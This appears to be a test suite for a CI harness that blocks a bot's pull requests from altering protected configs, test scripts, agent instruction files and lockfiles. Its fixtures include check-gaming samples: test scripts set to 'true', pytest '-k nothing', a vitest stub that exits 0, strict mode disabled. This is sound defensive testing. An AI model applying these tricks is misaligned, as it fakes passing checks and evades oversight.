import { strict as assert } from 'node:assert';
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { describe, it } from 'node:test';
import {
  computeLock, directoryReader, lockfileProblems, lockMismatches, matches, npmScripts, parseJson, planKindOf, prKind, protectedChanges, protectionRules, verify,
} from '../src/ci/harness-ci.ts';
import { run, runOk } from '../src/util.ts';
import { tempDir } from './helpers/toy-repo.ts';

const script = join(import.meta.dirname, '..', 'src', 'ci', 'harness-ci.ts');
const BOT = 'acme-harness[bot]';

function write(root: string, files: Record<string, string>): void {
  for (const [path, content] of Object.entries(files)) {
    mkdirSync(dirname(join(root, path)), { recursive: true });
    writeFileSync(join(root, path), content);
  }
}

const BASE: Record<string, string> = {
  'harness/config.json': JSON.stringify({
    harnessVersion: '0.1.0',
    project: { name: 'shop', repo: 'acme/shop', bot: BOT },
    checks: [{ id: 'lint', run: 'npm run lint', phase: 'pre-merge' }],
    protect: { files: ['eslint.rules.js'] },
  }),
  'harness/modules/shop/plans/P1.json': JSON.stringify({
    id: 'P1', module: 'shop', title: 'T', goal: 'G',
    features: [{ id: 'F01', title: 'A', description: 'd', expected: 'e', checks: [{ id: 'F01-test', run: 'npm test', phase: 'pre-merge' }] }],
  }),
  'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'eslint .', test: 'node --test', build: 'tsc' } }, null, 2),
  'tsconfig.json': '{\n  // strict is protected\n  "compilerOptions": { "strict": true, "target": "es2024", },\n}\n',
  'progress.txt': '2026-01-01T00:00:00Z feature.accepted shop/P0/F00 attempt=1 "old"\n',
  'src/app.js': 'export const x = 1;\n',
};

/** The base's files with `harness/config.json` extended, such as with a `terraform` section. */
function withConfig(extra: Record<string, unknown>): Record<string, string> {
  return { ...BASE, 'harness/config.json': JSON.stringify({ ...(JSON.parse(BASE['harness/config.json']!) as object), ...extra }) };
}

/** A repository with main, and a branch with `changes` on top; returns trees and the changed paths. */
async function change(changes: Record<string, string>, files: Record<string, string> = BASE) {
  const dir = tempDir('ci');
  write(dir, files);
  const git = (...args: string[]) => runOk('git', ['-C', dir, '-c', 'user.name=t', '-c', 'user.email=t@test.invalid', ...args]);
  await runOk('git', ['init', '--quiet', '--initial-branch=main', dir]);
  await git('add', '-A');
  await git('commit', '--quiet', '-m', 'base');
  const base = (await git('rev-parse', 'HEAD')).trim();
  await git('checkout', '--quiet', '-b', 'plan/shop/P1');
  write(dir, changes);
  await git('add', '-A');
  await git('commit', '--quiet', '--allow-empty', '-m', 'change');
  const head = (await git('rev-parse', 'HEAD')).trim();
  const baseDir = tempDir('base');
  await runOk('git', ['clone', '--quiet', dir, baseDir]);
  await runOk('git', ['-C', baseDir, 'checkout', '--quiet', base]);
  const changed = (await git('diff', '-z', '--name-only', `${base}...${head}`)).split('\0').filter(Boolean);
  return { dir, baseDir, base, head, changed, baseTree: directoryReader(baseDir), headTree: directoryReader(dir) };
}

describe('protection rules', () => {
  it('finds the npm scripts a check runs', () => {
    const root = (command: string) => npmScripts(command).map(({ dir, script }) => (dir ? `${dir}:${script}` : script));
    assert.deepEqual(root('npm run lint && npm test -- --watch=false; npm t; npm start'), ['lint', 'test', 'test', 'start']);
    assert.deepEqual(root('node --test'), []);
    // npm's options are skipped, before the command and after `run`, with the value of those that take one.
    assert.deepEqual(root('npm run -s lint'), ['lint']);
    assert.deepEqual(root('npm -s test'), ['test']);
    assert.deepEqual(root('npm --prefix . test && npm --if-present run-script build:prod'), ['test', 'build:prod']);
    assert.deepEqual(root('CI=1 npm --loglevel=silent restart; (npm stop)'), ['restart', 'stop']);
    assert.deepEqual(root('node --run lint && node --run=typecheck'), ['lint', 'typecheck']);
    assert.deepEqual(root('npm ci && npx vitest --run'), []);
  });

  it('finds the package.json each script is in: --prefix, -C, --workspace, -w, and a cd before it', () => {
    const where = (command: string) => npmScripts(command).map(({ dir, script }) => `${dir || '.'}:${script}`);
    assert.deepEqual(where('npm --prefix web test && npm -C ./api run lint && npm --prefix=docs start'), ['web:test', 'api:lint', 'docs:start']);
    assert.deepEqual(where('npm -w packages/app run build && npm --workspace=packages/lib test'), ['packages/app:build', 'packages/lib:test']);
    assert.deepEqual(where('cd web && npm test && cd ../api && node --run lint'), ['web:test', 'api:lint']);
    assert.deepEqual(where('cd web/ && cd .. && npm test; cd /tmp && npm test; cd ../.. && npm t'), ['.:test', '.:test', '.:test']);
  });

  it("pin the scripts the checks run, with npm's hooks around them, in the package.json each is in", async () => {
    const { baseTree } = await change({});
    const rules = await protectionRules(baseTree);
    assert.deepEqual(rules.fields['package.json'], [
      '/scripts/lint', '/scripts/prelint', '/scripts/postlint', '/scripts/test', '/scripts/pretest', '/scripts/posttest',
    ]);
    for (const field of ['/jest', '/overrides', '/scripts/prepare', '/scripts/postinstall', '/eslintConfig']) assert.ok(rules.fields['**/package.json']!.includes(field), field);
    assert.ok(rules.paths.includes('eslint.rules.js'));
    assert.ok(rules.paths.includes('harness/**'));

    const web = await change({}, withConfig({ checks: [{ id: 'web', run: 'cd web && npm test', phase: 'pre-merge' }] }));
    assert.deepEqual((await protectionRules(web.baseTree)).fields['web/package.json'], ['/scripts/test', '/scripts/pretest', '/scripts/posttest']);
  });

  it("protect what npm runs or applies by itself when it installs, in every package.json", async () => {
    const pkg = (extra: object) => JSON.stringify({ name: 'shop', scripts: { lint: 'eslint .', test: 'node --test', build: 'tsc', ...extra } }, null, 2);
    const files = { ...BASE, 'packages/a/package.json': JSON.stringify({ name: 'a' }) };
    const pr = await change({
      'package.json': pkg({ prepare: 'node tools/prepare.mjs' }),
      'packages/a/package.json': JSON.stringify({ name: 'a', scripts: { postinstall: 'node x.js' }, overrides: { b: '1.0.0' } }),
      'patches/vitest+4.0.0.patch': '-', '.npm-extension.mjs': '-',
    }, files);
    assert.deepEqual((await protectedChanges(pr.baseTree, pr.headTree, pr.changed, { progress: 'append' })).sort(), [
      '.npm-extension.mjs', 'package.json /scripts/prepare', 'packages/a/package.json /overrides', 'packages/a/package.json /scripts/postinstall', 'patches/vitest+4.0.0.patch',
    ]);
  });

  it("protect the scripts a check runs in another folder's package.json, and that package's own configs", async () => {
    const files = {
      ...withConfig({ checks: [{ id: 'web', run: 'npm --prefix web test', phase: 'pre-merge' }] }),
      'web/package.json': JSON.stringify({ name: 'web', scripts: { test: 'vitest run' } }),
      'web/tsconfig.json': JSON.stringify({ compilerOptions: { strict: true }, include: ['src'] }),
    };
    const pr = await change({
      'web/package.json': JSON.stringify({ name: 'web', scripts: { test: 'true' } }),
      'web/tsconfig.json': JSON.stringify({ compilerOptions: { strict: true }, include: ['src/ok'] }),
      'web/vitest.config.ts': 'export default {};\n', 'web/.eslintignore': 'src\n', 'web/.prettierignore': 'src\n',
    }, files);
    assert.deepEqual((await protectedChanges(pr.baseTree, pr.headTree, pr.changed, { progress: 'append' })).sort(), [
      'web/.eslintignore', 'web/.prettierignore', 'web/package.json /scripts/test', 'web/tsconfig.json /include', 'web/vitest.config.ts',
    ]);
  });

  it("protect pytest's tables in pyproject.toml and setup.cfg, and the owner's own, as text", async () => {
    const pyproject = '[project]\nname = "shop"\n\n[tool.pytest.ini_options]\naddopts = "-q"\n\n[tool.ruff]\nline-length = 100\n';
    const files = {
      ...withConfig({ protect: { files: ['eslint.rules.js'], tomlTables: { 'pyproject.toml': ['tool.mypy'] } } }),
      'pyproject.toml': pyproject, 'svc/pyproject.toml': pyproject, 'setup.cfg': '[metadata]\nname = shop\n[tool:pytest]\naddopts = -q\n',
    };
    // Ordinary changes: the project's version, another tool's table.
    const fine = await change({ 'pyproject.toml': pyproject.replace('name = "shop"', 'name = "shop2"').replace('100', '120') }, files);
    assert.deepEqual(await protectedChanges(fine.baseTree, fine.headTree, fine.changed, { progress: 'append' }), []);
    const pr = await change({
      'pyproject.toml': `${pyproject.replace('-q', '-q -k nothing')}\n[tool.mypy]\nstrict = false\n`,
      // A dotted key in a table above pytest's reaches into it.
      'svc/pyproject.toml': `[tool]\npytest.ini_options.addopts = "-k nothing"\n\n${pyproject}`,
      'setup.cfg': '[metadata]\nname = shop\n[tool:pytest]\naddopts = -k nothing\n',
    }, files);
    assert.deepEqual((await protectedChanges(pr.baseTree, pr.headTree, pr.changed, { progress: 'append' })).sort(), [
      'pyproject.toml [tool.mypy]', 'pyproject.toml [tool.pytest.ini_options]', 'pyproject.toml [tool.pytest]',
      'setup.cfg [tool:pytest]', 'svc/pyproject.toml [tool.pytest.ini_options]', 'svc/pyproject.toml [tool.pytest]',
    ]);
    const lock = await computeLock(pr.headTree);
    const entry = lock.entries.find((e) => e.path === 'svc/pyproject.toml');
    assert.ok(entry && 'tables' in entry && entry.tables?.['tool.pytest'], JSON.stringify(entry));
  });

  it('match patterns segment by segment: * and ? within one, ** across any number', () => {
    const yes: Array<[string, string]> = [
      ['CLAUDE.md', '**/CLAUDE.md'], ['a/b/CLAUDE.md', '**/CLAUDE.md'], ['src/.claude/rules/x.md', '**/.claude/**'], ['src/.claude', '**/.claude/**'],
      ['harness/a\nb', 'harness/**'], ['a/b', 'a/**/b'], ['a/x/y/b', 'a/**/b'], ['src/a.ts', 'src/*.ts'], ['docs/a.md', 'docs/?.md'],
      ['x.ts', './x.ts'], ['config/a/b.yml', 'config/'], ['config/a/b.yml', 'config///'], ['a+b (1).txt', 'a+b (1).txt'],
    ];
    const no: Array<[string, string]> = [
      ['a/xCLAUDE.md', '**/CLAUDE.md'], ['CLAUDE.md.bak', '**/CLAUDE.md'], ['harnessx/a', 'harness/**'], ['src/a/b.ts', 'src/*.ts'],
      ['docs/ab.md', 'docs/?.md'], ['configs/a.yml', 'config/'], ['aab (1).txt', 'a+b (1).txt'],
    ];
    for (const [path, pattern] of yes) assert.ok(matches(path, pattern), `${path} matches ${pattern}`);
    for (const [path, pattern] of no) assert.ok(!matches(path, pattern), `${path} doesn't match ${pattern}`);
  });

  it('read protect.files in linear time, even a pattern with a long run of slashes before its end', async () => {
    const files: Record<string, string> = { 'harness/config.json': JSON.stringify({ protect: { files: [`a${'/'.repeat(100_000)}b`, 'config///'] } }) };
    const tree = { read: async (path: string) => files[path], list: async () => Object.keys(files) };
    const started = performance.now();
    const rules = await protectionRules(tree);
    assert.ok(performance.now() - started < 1000);
    assert.ok(rules.paths.includes('config/**'));
  });

  it('protect the instructions Claude Code reads in any folder, and the configs that decide what a check runs', async () => {
    const pr = await change({
      'CLAUDE.local.md': '-', 'src/CLAUDE.md': '-', 'src/CLAUDE.local.md': '-', 'src/AGENTS.md': '-', 'src/.claude/rules/x.md': '-',
      'vitest.config.mts': '-', 'vite.config.ts': '-', 'jest.config.cjs': '-', 'jest.config.json': '{}', 'babel.config.js': '-', 'src/.babelrc': '{}',
      '.mocharc.yml': '-', 'playwright.config.mts': '-', 'pytest.ini': '-', 'tests/unit/pytest.ini': '-', 'tox.ini': '-', 'tests/conftest.py': '-',
      'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'eslint .', test: 'node --test', build: 'tsc' }, jest: { testMatch: [] } }, null, 2),
      // A package's own config, in a monorepo; and what isn't instructions.
      'packages/a/vitest.config.ts': '-', 'src/claude.md': '-', 'docs/CLAUDE.md.bak': '-',
    });
    const problems = await protectedChanges(pr.baseTree, pr.headTree, pr.changed, { progress: 'append' });
    assert.deepEqual(problems.sort(), [
      '.mocharc.yml', 'CLAUDE.local.md', 'babel.config.js', 'jest.config.cjs', 'jest.config.json', 'package.json /jest', 'packages/a/vitest.config.ts', 'playwright.config.mts', 'pytest.ini',
      'src/.babelrc', 'src/.claude/rules/x.md', 'src/AGENTS.md', 'src/CLAUDE.local.md', 'src/CLAUDE.md', 'tests/conftest.py', 'tests/unit/pytest.ini', 'tox.ini',
      'vite.config.ts', 'vitest.config.mts',
    ]);
  });

  it('read protect.files as globs, with ./ and a trailing slash as written', async () => {
    const config = withConfig({ protect: { files: ['./secret.ts', 'config/', 'db/**/*.sql', '**/fixtures/*.json', 'docs/?.md'] } });
    const pr = await change({
      'secret.ts': '-', 'config/a/b.yml': '-', 'db/schema.sql': '-', 'db/m/001.sql': '-', 'test/fixtures/a.json': '-', 'fixtures/b.json': '-', 'docs/a.md': '-',
      'db/m/001.txt': '-', 'test/fixtures/deep/c.json': '-', 'docs/ab.md': '-', 'src/secret.ts': '-',
    }, config);
    assert.deepEqual((await protectedChanges(pr.baseTree, pr.headTree, pr.changed, { progress: 'append' })).sort(), [
      'config/a/b.yml', 'db/m/001.sql', 'db/schema.sql', 'docs/a.md', 'fixtures/b.json', 'secret.ts', 'test/fixtures/a.json',
    ]);
  });

  it('flag protected files and fields, and let the rest change', async () => {
    const touched = await change({
      'src/app.js': 'export const x = 2;\n',
      'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'true', test: 'node --test', build: 'tsc -b', prelint: 'true' } }, null, 2),
      'tsconfig.json': '{ "compilerOptions": { "strict": false, "target": "es2022" } }\n',
      'harness/modules/shop/checks/x.sh': 'true\n',
      'eslint.rules.js': 'export default [];\n',
    });
    const problems = await protectedChanges(touched.baseTree, touched.headTree, touched.changed, { progress: 'append' });
    assert.deepEqual(problems.sort(), [
      'eslint.rules.js', 'harness/modules/shop/checks/x.sh', 'package.json /scripts/lint', 'package.json /scripts/prelint', 'tsconfig.json /compilerOptions/strict',
    ]);

    const fine = await change({ 'src/app.js': 'export const x = 3;\n', 'package.json': JSON.stringify({ name: 'shop', scripts: { lint: 'eslint .', test: 'node --test', build: 'tsc -b' } }) });
    assert.deepEqual(await protectedChanges(fine.baseTree, fine.headTree, fine.changed, { progress: 'append' }), []);
  });

  it('let progress.txt grow in a PR, never be rewritten, and stay out of an agent\'s reach', async () => {
    const grown = await change({ 'progress.txt': `${BASE['progress.txt']}2026-01-02T00:00:00Z feature.accepted shop/P1/F01 attempt=1 "new"\n` });
    assert.deepEqual(await protectedChanges(grown.baseTree, grown.headTree, grown.changed, { progress: 'append' }), []);
    assert.deepEqual(await protectedChanges(grown.baseTree, grown.headTree, grown.changed, { progress: 'frozen' }), ['progress.txt']);
    const rewritten = await change({ 'progress.txt': 'nothing happened\n' });
    assert.deepEqual(await protectedChanges(rewritten.baseTree, rewritten.headTree, rewritten.changed, { progress: 'append' }), ['progress.txt (only lines may be added)']);
  });

  it('accept only the public npm registry in package-lock.json, and the links the base already has', async () => {
    const lock = (packages: Record<string, object>) => JSON.stringify({ packages: { '': { name: 'shop' }, ...packages } });
    const workspace = { 'node_modules/c': { resolved: 'packages/c', link: true }, 'packages/c': { name: 'c', version: '1.0.0' } };
    const base = { ...BASE, 'package-lock.json': lock(workspace) };
    const pr = await change({
      'package-lock.json': lock({
        ...workspace,
        'node_modules/a': { resolved: 'https://registry.npmjs.org/a/-/a-1.0.0.tgz' },
        'node_modules/b': { resolved: 'git+ssh://git@example.com/b.git#abc' },
        // A stub that exits 0, where the checks expect vitest.
        'node_modules/vitest': { resolved: 'tools/vitest', link: true },
        'tools/vitest': { name: 'vitest', version: '4.0.0' },
      }),
    }, base);
    assert.deepEqual(await lockfileProblems(pr.baseTree, pr.headTree), [
      'node_modules/b resolves from git+ssh://git@example.com/b.git#abc', "node_modules/vitest links to tools/vitest, which the base branch doesn't",
    ]);
    const moved = await change({ 'package-lock.json': lock({ ...workspace, 'node_modules/c': { resolved: 'tools/c', link: true } }) }, base);
    assert.deepEqual(await lockfileProblems(moved.baseTree, moved.headTree), ["node_modules/c links to tools/c, which the base branch doesn't"]);
    const plan = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1', title: 'Plan: [CODE] [shop/P1] T' };
    assert.ok((await verify(plan)).includes("package-lock.json: node_modules/vitest links to tools/vitest, which the base branch doesn't"));
  });

  it('write a hash list that matches its tree until something protected changes', async () => {
    const { dir, baseTree } = await change({});
    const lock = await computeLock(baseTree);
    assert.ok(lock.entries.some((e) => e.path === 'harness/config.json' && 'sha256' in e));
    assert.ok(lock.entries.some((e) => e.path === 'CLAUDE.md' && 'sha256' in e && e.sha256 === 'absent'));
    write(dir, { 'harness/lock.json': JSON.stringify(lock) });
    assert.deepEqual(await lockMismatches(directoryReader(dir)), []);
    write(dir, { 'tsconfig.json': '{ "compilerOptions": { "strict": false } }' });
    assert.deepEqual(await lockMismatches(directoryReader(dir)), [
      'tsconfig.json: not as listed', 'tsconfig.json: listed, but different or gone',
    ]);
  });

  it("hash what git sees, never what it ignores, so the owner's tree and CI's checkout agree", async () => {
    const dir = tempDir('lock');
    write(dir, { ...BASE, '.gitignore': 'node_modules/\n*.log\n', 'src/CLAUDE.md': '# src\n' });
    const git = (...args: string[]) => runOk('git', ['-C', dir, '-c', 'user.name=t', '-c', 'user.email=t@test.invalid', ...args]);
    await runOk('git', ['init', '--quiet', '--initial-branch=main', dir]);
    await git('add', '-A');
    await git('commit', '--quiet', '-m', 'base');
    // Installed packages and a log, which git ignores, and an instruction file not committed yet.
    write(dir, { 'node_modules/pkg/CLAUDE.md': '-', 'node_modules/pkg/conftest.py': '-', 'harness/debug.log': '-', 'lib/AGENTS.md': '# lib\n' });
    const lock = await computeLock(directoryReader(dir));
    const paths = lock.entries.map((e) => e.path);
    assert.ok(paths.includes('src/CLAUDE.md') && paths.includes('lib/AGENTS.md'), paths.join(' '));
    assert.ok(!paths.some((p) => p.startsWith('node_modules/') || p.endsWith('.log')), paths.join(' '));
    write(dir, { 'harness/lock.json': JSON.stringify(lock) });
    await git('add', '-A');
    await git('commit', '--quiet', '-m', 'lock');
    const checkout = tempDir('checkout');
    await runOk('git', ['clone', '--quiet', dir, checkout]);
    assert.deepEqual(await lockMismatches(directoryReader(checkout)), []);
  });

  it('hash the same whatever the machine\'s locale', async () => {
    const dir = tempDir('locale');
    write(dir, {
      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x' }, protect: { jsonFields: { 'h.json': ['/v'], 'ch.json': ['/v'] } } }),
      'h.json': JSON.stringify({ v: { h: 1, ch: 2, i: 3 } }),
      'ch.json': JSON.stringify({ v: { i: 1, ch: 2, h: 3 } }),
    });
    // Czech sorts "ch" after "h".
    const lock = (locale: string) => runOk('node', [script, 'lock', '--dir', dir], { env: { ...process.env, LANG: locale, LC_ALL: locale } });
    assert.equal(await lock('cs_CZ.UTF-8'), await lock('en_US.UTF-8'));
  });
});

describe('verify', () => {
  it("tells a PR's kind by its author and branch, never by its title", () => {
    assert.equal(prKind(BOT, 'plan/shop/P1', BOT), 'Plan');
    assert.equal(prKind(BOT, 'fix/shop/P1-2', BOT), 'Fix');
    assert.equal(prKind(BOT, 'locked/shop', BOT), 'Arch', "a change to built features' definitions is the Architect's");
    assert.equal(prKind('owner', 'plan/shop/P1', BOT), 'Owner');
    assert.equal(prKind('owner', 'harness/upgrade-0.2.0', BOT), 'Harness');
    assert.equal(prKind(BOT, 'feature/x', BOT), 'Owner');
  });

  it('fails a Plan PR that changes a protected file, or carries the wrong title', async () => {
    const pr = await change({ 'harness/modules/shop/plans/P1.json': '{}', 'src/app.js': 'export const x = 9;\n' });
    const input = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1' };
    assert.deepEqual(await verify({ ...input, title: 'Plan: [CODE] [shop/P1] T' }), ['changes a protected file: harness/modules/shop/plans/P1.json']);
    assert.match((await verify({ ...input, title: 'Owner: sneaky' }))[0]!, /this is a Plan PR .* must start with "Plan: "/);
    assert.deepEqual(await verify({ ...input, author: 'owner', title: 'Owner: design change' }), []);
  });

  it("tells a plan's kind by its features, and a title's tag must agree", async () => {
    assert.equal(planKindOf([{ kind: 'app' }, {}]), 'CODE');
    assert.equal(planKindOf([{ kind: 'infra' }, { kind: 'infra' }]), 'INFRA');
    assert.equal(planKindOf([{ kind: 'app' }, { kind: 'infra' }]), 'MIXED');

    // P1 on the base has one feature without a kind: a CODE plan.
    const pr = await change({ 'src/app.js': 'export const x = 2;\n' });
    const input = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'plan/shop/P1' };
    assert.deepEqual(await verify({ ...input, title: 'Plan: [CODE] [shop/P1] T' }), []);
    assert.deepEqual(await verify({ ...input, title: 'Plan: [INFRA] [shop/P1] T' }), [
      "the title says [INFRA], but shop/P1 is a CODE plan on the base branch: its features' kinds decide",
    ]);
    assert.deepEqual(await verify({ ...input, title: 'Plan: [MIXED_INFRA_AND_CODE] [shop/P1] T' }), [
      "the title says [MIXED_INFRA_AND_CODE], but shop/P1 is a CODE plan on the base branch: its features' kinds decide",
    ]);
    // The format, the plan named in it, and a tag CI knows.
    for (const title of ['Plan: shop/P1 — T', 'Plan: shop/P1 -CODE- T', 'Plan: [CODE] [shop/P2] T', 'Plan: [MIXED] [shop/P1] T', 'Plan: [CODE] [shop/P1]']) {
      assert.deepEqual(await verify({ ...input, title }), [`a Plan PR's title is "Plan: [CODE|INFRA|MIXED_INFRA_AND_CODE] [shop/P1] <title>", not "${title}"`], title);
    }
    assert.match((await verify({ ...input, branch: 'plan/shop/P9', title: 'Plan: [CODE] [shop/P9] T' }))[0]!, /plans\/P9\.json is missing or unreadable on the base branch/);
  });

  it("names what failed after the deploy in a Fix PR's title", async () => {
    const pr = await change({ 'src/app.js': 'export const x = 7;\n' });
    const input = { base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'fix/shop/P1-2' };
    assert.deepEqual(await verify({ ...input, title: 'Fix: [DEPLOY_FAILED] [shop/P1] round 2 after the deploy' }), []);
    assert.deepEqual(await verify({ ...input, title: 'Fix: [VERIFY_FAILED] [shop/P1] round 2 after the deploy' }), []);
    for (const title of ['Fix: shop/P1 — after the deploy, round 2', 'Fix: [CODE] [shop/P1] round 2', 'Fix: [VERIFY_FAILED] [shop/P2] round 2']) {
      assert.deepEqual(await verify({ ...input, title }), [`a Fix PR's title is "Fix: [DEPLOY_FAILED|VERIFY_FAILED] [shop/P1] <title>", not "${title}"`], title);
    }
  });

  it('keeps a CODE plan off the Terraform folder, and lets an INFRA plan change it', async () => {
    const terraform = { terraform: { dir: 'iac' } };
    const code = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n', 'src/app.js': 'export const x = 3;\n' }, withConfig(terraform));
    const input = { author: BOT, branch: 'plan/shop/P1', title: 'Plan: [CODE] [shop/P1] T' };
    assert.deepEqual(await verify({ ...input, base: code.baseTree, head: code.headTree, changedPaths: code.changed }), [
      'a CODE plan may not change iac/: infrastructure gets plans of its own (v3 §3.1); changed: iac/queue.tf',
    ]);

    const noTerraform = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n' });
    assert.deepEqual(await verify({ ...input, base: noTerraform.baseTree, head: noTerraform.headTree, changedPaths: noTerraform.changed }), [], 'without a terraform section, nothing is checked');

    const infraPlan = JSON.stringify({
      id: 'P1', module: 'shop', title: 'T', goal: 'G',
      features: [{ id: 'F01', title: 'A', kind: 'infra', description: 'd', expected: 'e', checks: [{ id: 'F01-plan', run: 'node check.mjs', phase: 'pre-merge', needs: ['tfplan'] }] }],
    });
    const infra = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n' }, { ...withConfig(terraform), 'harness/modules/shop/plans/P1.json': infraPlan });
    assert.deepEqual(await verify({ ...input, title: 'Plan: [INFRA] [shop/P1] T', base: infra.baseTree, head: infra.headTree, changedPaths: infra.changed }), []);

    // The folder as the owner may write it.
    for (const dir of ['./iac', 'iac/']) {
      const written = await change({ 'iac/queue.tf': 'resource "aws_sqs_queue" "q" {}\n' }, withConfig({ terraform: { dir } }));
      assert.deepEqual(await verify({ ...input, base: written.baseTree, head: written.headTree, changedPaths: written.changed }), [
        'a CODE plan may not change iac/: infrastructure gets plans of its own (v3 §3.1); changed: iac/queue.tf',
      ], dir);
    }
    // Terraform at the root: every .tf and .tf.json file is infrastructure.
    for (const dir of ['.', '']) {
      const root = await change({ 'modules/q/main.tf': 'resource "aws_sqs_queue" "q" {}\n', 'stack.tf.json': '{}', 'src/app.js': 'export const x = 3;\n' }, withConfig({ terraform: { dir } }));
      assert.deepEqual(await verify({ ...input, base: root.baseTree, head: root.headTree, changedPaths: root.changed }), [
        'a CODE plan may not change Terraform files: infrastructure gets plans of its own (v3 §3.1); changed: modules/q/main.tf, stack.tf.json',
      ], dir);
    }
  });

  it('lets an Arch PR change the design with a matching hash list, and nothing else', async () => {
    const design = { 'harness/modules/shop/plans/P2.json': JSON.stringify({ id: 'P2', module: 'shop', title: 'T', goal: 'G', features: [] }), 'ARCHITECTURE.md': '# Decisions\n' };
    const draft = await change(design);
    const lock = await computeLock(draft.headTree);
    const arch = await change({ ...design, 'harness/lock.json': JSON.stringify(lock) });
    // Main already has shop's design: a change to it.
    const input = { base: arch.baseTree, head: arch.headTree, author: BOT, branch: 'arch/shop', title: 'Arch: [DESIGN_MODIFY] [shop] P2' };
    assert.deepEqual(await verify({ ...input, changedPaths: arch.changed }), []);
    assert.deepEqual(await verify({ ...input, title: 'Arch: [DESIGN] [shop] P2', changedPaths: arch.changed }), [
      'this Arch PR changes the design of shop, which main already has, so its title is "Arch: [DESIGN_MODIFY] [shop] <title>", not "Arch: [DESIGN] [shop] P2"',
    ]);

    const code = await change({ ...design, 'harness/lock.json': JSON.stringify(lock), 'src/app.js': 'export const x = 5;\n' });
    assert.deepEqual(await verify({ ...input, base: code.baseTree, head: code.headTree, changedPaths: code.changed }), [
      'an Arch PR may not change src/app.js: only the design, shared knowledge and tool configs',
    ]);

    const stale = await change({ ...design, 'harness/lock.json': JSON.stringify(lock), 'init.sh': 'npm ci\n' });
    const problems = await verify({ ...input, base: stale.baseTree, head: stale.headTree, changedPaths: stale.changed });
    assert.deepEqual(problems, ['harness/lock.json: init.sh: not as listed', 'harness/lock.json: init.sh: listed, but different or gone']);

    // The base's rules judge it: protecting src/ in its head doesn't let it rewrite src/.
    const widened = { 'harness/config.json': withConfig({ protect: { files: ['src/**'] } })['harness/config.json']!, 'src/app.js': 'export const x = 6;\n' };
    const widenedLock = await computeLock((await change(widened)).headTree);
    const self = await change({ ...widened, 'harness/lock.json': JSON.stringify(widenedLock) });
    assert.deepEqual(await verify({ ...input, base: self.baseTree, head: self.headTree, changedPaths: self.changed }), [
      'an Arch PR may not change src/app.js: only the design, shared knowledge and tool configs',
    ]);
  });

  it("tags a module's first design [DESIGN], once: main has no plan of it yet", async () => {
    const first = { 'harness/modules/cart/plans/P1.json': JSON.stringify({ id: 'P1', module: 'cart', title: 'T', goal: 'G', features: [] }) };
    const lock = await computeLock((await change(first)).headTree);
    const arch = await change({ ...first, 'harness/lock.json': JSON.stringify(lock) });
    const input = { base: arch.baseTree, head: arch.headTree, changedPaths: arch.changed, author: BOT, branch: 'arch/cart' };
    assert.deepEqual(await verify({ ...input, title: 'Arch: [DESIGN] [cart] The cart' }), []);
    assert.deepEqual(await verify({ ...input, title: 'Arch: [DESIGN_MODIFY] [cart] The cart' }), [
      'this Arch PR is the first design of cart, so its title is "Arch: [DESIGN] [cart] <title>", not "Arch: [DESIGN_MODIFY] [cart] The cart"',
    ]);
  });

  it("lets a CHANGED_LOCKED_FILES PR change features' definitions and their check scripts, and nothing else", async () => {
    const plan = (features: object[], title = 'T') => JSON.stringify({ id: 'P1', module: 'shop', title, goal: 'G', features });
    const feature = (run: string, expected = 'e') => ({ id: 'F01', title: 'A', description: 'd', expected, checks: [{ id: 'F01-test', run, phase: 'pre-merge' }] });
    const base = { ...BASE, 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/shop/checks/F01.sh')]), 'harness/modules/shop/checks/F01.sh': '[ "$x" = "0" ]\n' };
    const locked = async (files: Record<string, string>, from = base) => {
      const lock = await computeLock((await change(files, from)).headTree);
      const pr = await change({ ...files, 'harness/lock.json': JSON.stringify(lock) }, from);
      return verify({ base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'locked/shop', title: 'Arch: [CHANGED_LOCKED_FILES] [shop] F01 compares numbers' });
    };
    // A fixed script and a clearer expected result: the definitions of an existing feature.
    assert.deepEqual(await locked({ 'harness/modules/shop/checks/F01.sh': '[ "$x" -eq 0 ]\n', 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/shop/checks/F01.sh', 'e, as a number')]) }), []);
    assert.deepEqual(await locked({ 'src/app.js': 'export const x = 8;\n' }), [
      "a CHANGED_LOCKED_FILES PR changes only the definitions of shop's built features and the scripts in harness/modules/shop/ that their checks run, not src/app.js",
    ]);
    // Another module's script, though a check of shop runs it: it would redefine that module's features too.
    const shared = { ...base, 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/cart/checks/C.sh')]), 'harness/modules/cart/checks/C.sh': 'true\n' };
    assert.deepEqual(await locked({ 'harness/modules/cart/checks/C.sh': 'exit 0\n' }, shared), [
      "a CHANGED_LOCKED_FILES PR changes only the definitions of shop's built features and the scripts in harness/modules/shop/ that their checks run, not harness/modules/cart/checks/C.sh",
    ]);
    assert.deepEqual(await locked({ 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/shop/checks/F01.sh')], 'Renamed') }), [
      "harness/modules/shop/plans/P1.json: a CHANGED_LOCKED_FILES PR changes features, not the plan's own fields",
    ]);
    assert.deepEqual(await locked({ 'harness/modules/shop/plans/P1.json': plan([feature('bash harness/modules/shop/checks/F01.sh'), { ...feature('true'), id: 'F02' }]) }), [
      'harness/modules/shop/plans/P1.json: a CHANGED_LOCKED_FILES PR neither adds, removes, renames nor moves a feature',
    ]);
    assert.deepEqual(await locked({ 'harness/modules/shop/plans/P2.json': plan([]) }), ['harness/modules/shop/plans/P2.json: a CHANGED_LOCKED_FILES PR neither adds nor removes a plan']);
    // Its own tag, on its own branch.
